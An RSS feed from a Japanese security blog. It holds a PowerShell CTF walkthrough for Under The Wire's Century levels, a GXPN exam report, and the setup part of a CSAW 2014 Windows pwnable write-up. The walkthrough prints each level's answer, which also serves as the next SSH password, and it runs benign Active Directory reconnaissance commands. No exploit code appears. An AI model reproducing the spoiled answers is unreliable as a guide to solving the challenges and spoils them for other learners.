<?xml version="1.0" encoding="utf-8" standalone="yes" ?>




<?xml-stylesheet type="text/xsl" href="#stylesheet" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" exclude-result-prefixes="xsl">
    <xsl:output method="html" doctype-system="about:legacy-compat" />
    <xsl:template match="/rss">
      <html lang="en-us">
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Posts RSS | $ make life</title>
          <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=" />
        </head>
        <body>
          <nav class="u-background">
  <div class="u-wrapper">
    <ul class="Banner">
      <li class="Banner-item Banner-item--title">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
      </li>
      
    </ul>
  </div>
</nav>
          <main>
            <div class="u-wrapper">
              <div class="u-padding">
                <h2 class="Heading-title">
                  
                  <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/index.xml" rel="bookmark">Posts RSS</a>
                  
                </h2>
                
                <p>
                  To subscribe to this RSS feed, copy its address and paste it into your favorite feed reader.
                </p>
                
              </div>
            </div>
          </main>
          
<footer class="Footer">
  <div class="u-wrapper">
    <div class="u-padding">
      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
    </div>
  </div>
</footer>

        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
  <channel>
    <title>Posts on $ make life</title>
    <link>https://owlinux1000.github.io/blog/post/</link>
    <description>Recent content in Posts on $ make life</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 02 Dec 2019 23:00:00 +0900</lastBuildDate>
    <atom:link href="https://owlinux1000.github.io/blog/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Powershell学習サイトUnder The Wireの問題を解く</title>
      <link>https://owlinux1000.github.io/blog/post/powershell_ctf_utw/</link>
      <pubDate>Mon, 02 Dec 2019 23:00:00 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/powershell_ctf_utw/</guid>
      <description>

&lt;p&gt;本記事は、&lt;a href=&#34;https://adventar.org/calendars/4371&#34;&gt;彌冨研 Advent Calendar 2019&lt;/a&gt; の3日目の記事です。ちなみに2018年に彌冨研究室を卒業しました。卒業研究は、&lt;a href=&#34;https://ieeexplore.ieee.org/document/8368693&#34;&gt;One-dimensional convolutional neural networks for Android malware detection&lt;/a&gt; でした。&lt;/p&gt;

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;みなさんは、Powershellはお好きですか？僕は嫌いでした。主にWindowsでしか使わない点やよくわからない構文など勉強したいと思う意欲すら浮かびませんでした。しかしながら、セキュリティ界隈だと特にペネトレーションテストなどでは、Windows に標準的に導入されているPowershellは非常に有効なツールです。またマルウェアなどもPowershellを使うケースが非常に多いためセキュリティ業界ではPowershellの理解は必須となるツールの1つです。そこで重い腰を上げて勉強しようとした際にとあるサイトを見つけました。それが&lt;a href=&#34;https://underthewire.tech/&#34;&gt;Under The Wire&lt;/a&gt; です。このサイトは、CTF形式でPowershellについて学ぶことができるサイトです。本記事では、それの最初のレベルであるCenturyの解き方を紹介していきます。このサイトで提示されている環境へSSHでログインするとPowershellのプロンプトが表示されます。次の問題に進むためには、最初の問題を解く必要があり、その問題の答えが次の問題へのSSHパスワードになっています。&lt;/p&gt;

&lt;h2 id=&#34;century0-事前準備&#34;&gt;Century0（事前準備）&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Slackのチームに参加して、指定されているチャンネルにログインすると、&lt;code&gt;username:password&lt;/code&gt; を得ることができる&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;century1&#34;&gt;Century1&lt;/h2&gt;

&lt;h3 id=&#34;問題概要&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;当該システムのビルドバージョンを求める&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PSVersionTable&lt;/code&gt; という変数に様々なバージョン情報が格納されている&lt;/li&gt;
&lt;li&gt;下記結果より、答えは&lt;code&gt;10.0.14393.3053&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century1\documents&amp;gt; $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.14393.3053
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.14393.3053
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century2&#34;&gt;Century2&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-1&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;PowerShellでwgetのような挙動をするコマンドレット名（小文字）にデスクトップ上にあるファイルのファイル名を連結したものを求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-1&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Invoke-WebRequest がwgetのような動きをするコマンドレット&lt;/li&gt;
&lt;li&gt;デスクトップに移動すると443というファイル名のファイルが存在する&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;invoke-webrequest443&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;century3&#34;&gt;Century3&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-2&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップ上にあるファイル数を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-2&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Get-ChildItem で対象ディレクトリの中身の一覧を取得&lt;/li&gt;
&lt;li&gt;Where-Object を使ってファイルのみを抽出

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$_&lt;/code&gt; が、パイプラインで渡されたオブジェクトを示す&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PSIsContainer&lt;/code&gt; は、ディレクトリの場合&lt;code&gt;True&lt;/code&gt;を返す&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Measure でパイプラインで渡されたオブジェクトの数をカウント&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;123&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century3\documents&amp;gt; Get-ChildItem ..\Desktop | Where-Object { !$_.PSIsContainer} | Measure


Count    : 123
Average  :
Sum      :
Maximum  :
Minimum  :
Property :&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century4&#34;&gt;Century4&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-3&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップにある空白が含まれたディレクトリの中にあるファイル名を求めよ&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;61580&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-3&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Get-ChildItem で表示するだけ

&lt;ul&gt;
&lt;li&gt;ディレクトリ名に空白が含まれている場合は、&lt;code&gt;&#39;&lt;/code&gt;で囲う&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century4\Documents&amp;gt; Get-ChildItem &amp;#39;..\Desktop\Can You Open Me&amp;#39;


    Directory: C:\Users\century4\Desktop\Can You Open Me


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/30/2018   3:29 AM             24 61580&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century5&#34;&gt;Century5&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-4&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ドメイン名(TLDを除く)とデスクトップ上にあるファイルを連結したものを求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-4&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;環境変数USERDOMAINという値にドメイン名は格納されている&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;underthewire3347&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century6\documents&amp;gt; Get-ChildItem -Path env: | Where-Object {$_.NAME -eq &amp;#34;USERDNSDOMAIN&amp;#34;}

Name                           Value
----                           -----
USERDNSDOMAIN                  UNDERTHEWIRE.TECH&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century6&#34;&gt;Century6&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-5&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップ上のフォルダの数を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-5&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Century3とほぼ同様

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;()&lt;/code&gt;でくくって、Countプロパティにアクセスすれば値のみを表示できる&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;197&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century6\documents&amp;gt; (Get-ChildItem ..\Desktop | Where-Object { $_.PSIsContainer} | Measure).Count
197&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century7&#34;&gt;Century7&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-6&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ユーザプロファイル配下のどこかにあるreadmeファイルの中に記載されている値を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-6&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;数が少ないので愚直にできるが、再帰的な検索方法を用いた&lt;/li&gt;
&lt;li&gt;Get-ChildItem の&lt;code&gt;-Recurse&lt;/code&gt; オプションを利用することで再帰的に表示可能&lt;/li&gt;
&lt;li&gt;中を見てみると、答えは&lt;code&gt;7points&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;Get-ChildItem -Recurse ..


    Directory: C:\Users\century7


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/16/2016   1:23 PM                Desktop
d-r---        8/30/2018   3:10 AM                Documents
d-r---       10/28/2019   5:50 PM                Downloads
d-r---        7/16/2016   1:23 PM                Favorites
d-r---        7/16/2016   1:23 PM                Links
d-r---        7/16/2016   1:23 PM                Music
d-r---        7/16/2016   1:23 PM                Pictures
d-----        7/16/2016   1:23 PM                Saved Games
d-r---        7/16/2016   1:23 PM                Videos


    Directory: C:\Users\century7\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/30/2018   3:29 AM              7 Readme.txt&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century8&#34;&gt;Century8&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-7&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップにあるファイルの中のユニークな文字列の数を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-7&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Get-Content でcatが可能

&lt;ul&gt;
&lt;li&gt;元からエイリアス貼られているので&lt;code&gt;cat&lt;/code&gt;でもOK&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;ユニーク数を取るためには、sortしてuniqすれば良い

&lt;ul&gt;
&lt;li&gt;sortはSort-Objectのエイリアス&lt;/li&gt;
&lt;li&gt;Get-Unique でユニークな値を抽出&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;696&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century8\documents&amp;gt; Get-Content ..\Desktop\unique.txt | sort | Get-Unique | measure


Count    : 696
Average  :
Sum      :
Maximum  :
Minimum  :
Property :&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century9&#34;&gt;Century9&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-8&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップにあるファイルの161番目の単語を求めよ

&lt;ul&gt;
&lt;li&gt;空白で区切られた単語が並んでいる&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-8&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;()&lt;/code&gt;にして文字列として、Splitメソッドで空白で区切り添字160番目の要素にアクセス&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;pierid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century9\documents&amp;gt; (cat ..\Desktop\Word_File.txt).Split(&amp;#34; &amp;#34;)[160]
pierid&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century10&#34;&gt;Century10&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-9&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Windows Updateサービスの説明の10番目、8番目の単語とデスクトップ上のファイルのファイル名をつなげた値を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-9&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;WMI のWin32_Serviceクラスから説明を得る

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Get-Service&lt;/code&gt; でサービス情報を取得できるが、説明の部分は保持していなかった&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;説明は英文なため空白で区切られているのでSplitして10番目と8番目を抜き出してくる&lt;/li&gt;
&lt;li&gt;デスクトップ上のファイルのファイル名をつなげて答えは、&lt;code&gt;windowsupdates110&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century10\documents&amp;gt; word=(get-wmiobject win32_service -filter &amp;#34;name=&amp;#39;wuauserv&amp;#39;&amp;#34;).Description.Split(&amp;#34; &amp;#34;)
PS C:\Users\century10\documents&amp;gt; $word[9] + $word[7]
Windowsupdates&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century11&#34;&gt;Century11&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-10&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ユーザプロファイル配下の隠しファイルのファイル名を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-10&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Get-ChildItemの&lt;code&gt;-Hidden&lt;/code&gt;パラメータで表示できる

&lt;ul&gt;
&lt;li&gt;権限なくて見れないフォルダが多く出力されるが一つ怪しいのがある&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;secret_sauce&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century11\documents&amp;gt; Get-ChildItem -Hidden -Recurse ..
    Directory: C:\Users\century11\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--rh--        8/30/2018   3:34 AM             30 secret_sauce&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century12&#34;&gt;Century12&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-11&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;所属するドメインコントローラの説明とデスクトップ上にあるファイルのファイル名をつなげたものを求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-11&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;まずは、ドメインコントローラをGet-ADDomainControllerで確認する

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Name&lt;/code&gt;が&lt;code&gt;UTW&lt;/code&gt;だと判明する&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Get-ADComputerを用いて、Descriptionを表示する&lt;/li&gt;
&lt;li&gt;デスクトップのファイルのファイル名とつなげて答えは、&lt;code&gt;i_authenticate_things&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century12\documents&amp;gt; Get-ADDomainController


ComputerObjectDN           : CN=UTW,OU=Domain Controllers,DC=underthewire,DC=tech
DefaultPartition           : DC=underthewire,DC=tech
Domain                     : underthewire.tech
Enabled                    : True
Forest                     : underthewire.tech
HostName                   : utw.underthewire.tech
InvocationId               : 09ee1897-2210-4ac9-989d-e19b4241e9c6
IPv4Address                : 192.99.167.156
IPv6Address                :
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : UTW
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=UTW,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=underthewire,DC=tech
OperatingSystem            : Windows Server 2016 Standard
OperatingSystemHotfix      :
OperatingSystemServicePack :
OperatingSystemVersion     : 10.0 (1439
PS C:\Users\century12\documents&amp;gt; Get-ADComputer UTW -Properties Description


Description       : i_authenticate
DistinguishedName : CN=UTW,OU=Domain Controllers,DC=underthewire,DC=tech
DNSHostName       : utw.underthewire.tech
Enabled           : True
Name              : UTW
ObjectClass       : computer
ObjectGUID        : 5ca56844-bb73-4234-ac85-eed2d0d01a2e
SamAccountName    : UTW$
SID               : S-1-5-21-758131494-606461608-3556270690-1000
UserPrincipalName :&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century13&#34;&gt;Century13&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-12&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップにあるファイルの中の単語数を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-12&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ファイルの中身を空白でSplitしてMeasureにパイプラインで渡す&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;755&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century13\documents&amp;gt; (cat ..\Desktop\countmywords).Split(&amp;#34; &amp;#34;) | measure


Count    : 755
Average  :
Sum      :
Maximum  :
Minimum  :
Property :&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;century14&#34;&gt;Century14&lt;/h2&gt;

&lt;h3 id=&#34;問題概要-13&#34;&gt;問題概要&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;デスクトップ上にあるファイルの中で、&lt;code&gt;polo&lt;/code&gt;という単語の出現回数を求めよ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;解法-13&#34;&gt;解法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;中身の抽出は今まで通り行い、Select-Stringで&lt;code&gt;polo&lt;/code&gt;を検索してMeasureにパイプラインで渡す

&lt;ul&gt;
&lt;li&gt;完全一致させる必要があるため&lt;code&gt;&amp;quot;^polo$&amp;quot;&lt;/code&gt; を指定する必要がある&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;答えは、&lt;code&gt;153&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;PS C:\Users\century14\documents&amp;gt; (cat ..\Desktop\countpolos).Split(&amp;#34; &amp;#34;) | Select-String &amp;#34;^polo$&amp;#34; | measure


Count    : 153
Average  :
Sum      :
Maximum  :
Minimum  :
Property :&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;これをやる前はあまり好きになれなかったPowershellもやってるうちに好きになることができました。このサイトではまだ次のレベルがあるので取り組んでみようと思います。もしセキュリティ系の職種に付きたい方は、Powershellわかるとなにかと便利なので勉強しておくことをおすすめします。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>GIAC Exploit Researcher and Advanced Penetration Tester (GXPN) 合格体験記</title>
      <link>https://owlinux1000.github.io/blog/post/passed_gxpn/</link>
      <pubDate>Fri, 01 Nov 2019 21:15:46 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/passed_gxpn/</guid>
      <description>

&lt;h2 id=&#34;tl-dr&#34;&gt;tl; dr&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.giac.org/certification/exploit-researcher-advanced-penetration-tester-gxpn&#34;&gt;GIAC Exploit Researcher and Advanced Penetration Tester (GXPN)&lt;/a&gt; に85% で合格した&lt;/li&gt;
&lt;li&gt;勉強方法

&lt;ul&gt;
&lt;li&gt;受講したトレーニングのテキストを読み込むのと、演習をすべてやり直す&lt;/li&gt;
&lt;li&gt;模擬試験を本番と同様の状況で受ける（紙の辞書やテキストを用意して）&lt;/li&gt;
&lt;li&gt;実技テスト対策に、模擬試験では環境に慣れておく&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://owlinux1000.github.io/blog/post/passed_grem/&#34;&gt;GIAC Reverse Engineering Malware（GREM）合格体験記&lt;/a&gt; を書いてから約半年で2つ目のGIAC資格を取得することができた。前回は初めてのGIAC 試験だったのでたくさん文章を書いたが今回は簡単に勉強方法と感想だけ書いておこうと思う。&lt;br /&gt;
GXPNは、SANS 660 Advanced Penetration Testing, Exploit Writing, and Ethical Hacking に対応するGIAC資格で、主にペネトレーションテスト
に関する分野の問題が出題される。前回同様、トレーニング自体も受講したのでテキストや模擬試験x2を受けることができた。どんな問題が出題されるかは、&lt;a href=&#34;https://www.giac.org/certification/exploit-researcher-advanced-penetration-tester-gxpn&#34;&gt;公式サイト&lt;/a&gt;を見てほしい。&lt;/p&gt;

&lt;h2 id=&#34;勉強方法&#34;&gt;勉強方法&lt;/h2&gt;

&lt;p&gt;前回のGREMの記事で書いた事とまったく同じ感じの勉強を行った。しかしながら、GXPNでは実技テストが存在するため、具体的な中身については言えないが、トレーニングでやった演習などを通じて、「こういうことをやりたい場合、どのツールを使って、どうすればいいか」などがパッと浮かぶレベルには仕上げた（つもりだったがいくつかわからずもどかしかった）。また実技テストの環境が若干癖があるので、模擬試験を通してなれておくことをおすすめする。&lt;/p&gt;

&lt;h2 id=&#34;試験中&#34;&gt;試験中&lt;/h2&gt;

&lt;p&gt;今回の試験自体は、3時間だったが2時間程度で終える事ができた。というのもわからない問題が多くて、結構な数をスキップしたためかなり早く進んでしまっていた。最後スキップした問題が10問残っている状態で1時間30経過とかだったので、落ち着きながらテキストを見返したりしてスキップした問題を解いた。前回もそうだったが、「この問題があってれば合格できる！」といった願掛けみたいなことを脳内で思って答えた。最後の問題に答えたら、画面には85%という文字が見えて一安心した&lt;/p&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;所感だが、10月7日~12日にトレーニングを受けて11月1日の試験だったので、かなり勉強時間が短くて大変だった。1日ガッツリ勉強して行けそうだと思ったので、パッと翌日受けることにしてしまったが、前回もそんな感じで受ける日程を決めていたし、そのほうが良いのかもしれない。まぁなんとか良い得点で合格することができたのでほんと良かった。最近は、家庭内も仕事も共にすごく忙しく大変な時期だったので、そういう中でもちゃんと合格できたのは結構嬉しかった。家事など全面的に協力してくれた奥さんには本当に感謝の気持ちしかない。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>CSAW CTF 2014 Greenhornd writeup</title>
      <link>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</link>
      <pubDate>Thu, 19 Sep 2019 23:49:38 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。&lt;/p&gt;

&lt;h2 id=&#34;1-環境準備&#34;&gt;1. 環境準備&lt;/h2&gt;

&lt;h3 id=&#34;1-1-windows-os-の準備&#34;&gt;1.1 Windows OS の準備&lt;/h3&gt;

&lt;p&gt;Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、&lt;a href=&#34;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&#34;&gt;Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development&lt;/a&gt; を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。&lt;/p&gt;

&lt;h3 id=&#34;1-2-解析環境の準備&#34;&gt;1.2 解析環境の準備&lt;/h3&gt;

&lt;p&gt;本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。)  最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。&lt;/p&gt;

&lt;p&gt;次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/greenhornd.exe&#34;&gt;greenhornd.exe&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;問題のバイナリファイル&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/AppJailLauncher.exe&#34;&gt;AppJailLauncher.exe&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.microsoft.com/ja-jp/download/details.aspx?id=40784&#34;&gt;Visual Studio 2013 の Visual C++ 再頒布可能パッケージ&lt;/a&gt;

&lt;ul&gt;
